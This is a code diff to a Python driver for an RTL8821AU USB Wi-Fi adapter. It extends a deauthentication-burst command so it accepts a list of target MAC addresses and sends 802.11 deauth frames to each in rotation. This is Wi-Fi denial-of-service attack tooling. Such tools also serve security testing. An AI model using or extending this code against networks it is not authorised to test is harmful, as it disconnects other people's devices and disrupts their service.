@@ -1887,6 +1887,15 @@ class Rtl8821auUsb:
         if interval_ms <= 0:
             raise ValueError("interval_ms must be > 0")
 
+        raw_targets = [x.strip() for x in re.split(r"[,\s]+", str(dest or "")) if x.strip()]
+        targets: list[str] = []
+        for t in raw_targets:
+            if t not in targets:
+                targets.append(t)
+        if not targets:
+            raise ValueError("dest must not be empty")
+        target_idx = 0
+
         start = time.monotonic()
         end = None if duration_s <= 0 else (start + float(duration_s))
         next_send = start
@@ -1910,8 +1919,10 @@ class Rtl8821auUsb:
                     led_off_at = None
 
                 if now >= next_send:
+                    current_dest = targets[target_idx % len(targets)]
+                    target_idx += 1
                     for _ in range(burst_size):
-                        self.send_deauth(dest=dest, bssid=bssid, source=source, reason=reason, ep_out=ep_out)
+                        self.send_deauth(dest=current_dest, bssid=bssid, source=source, reason=reason, ep_out=ep_out)
                         sent += 1
                     next_send += interval_ms / 1000.0
                     if next_send < now:
@@ -2409,7 +2420,8 @@ def main(argv: list[str]) -> int:
     p_deauth_burst.add_argument("--init-mac", action="store_true")
     p_deauth_burst.add_argument("--channel", type=int, default=1)
     p_deauth_burst.add_argument("--bw", type=int, choices=(20, 40, 80), default=20)
-    p_deauth_burst.add_argument("--target-mac", required=True)
+    p_deauth_burst.add_argument("--target-mac", default="")
+    p_deauth_burst.add_argument("--target-macs", default="")
     p_deauth_burst.add_argument("--bssid", required=True)
     p_deauth_burst.add_argument("--source-mac", default=None)
     p_deauth_burst.add_argument("--reason", type=int, default=7)
@@ -3380,7 +3392,11 @@ def main(argv: list[str]) -> int:
                 try:
                     sent, written = dev.deauth_burst_capture_pcap(
                         pcap=pcap,
-                        dest=str(args.target_mac),
+                        dest=(
+                            str(args.target_macs).strip()
+                            if str(getattr(args, "target_macs", "") or "").strip()
+                            else str(getattr(args, "target_mac", "") or "").strip()
+                        ),
                         bssid=str(args.bssid),
                         source=str(args.source_mac) if args.source_mac is not None else None,
                         reason=int(args.reason),
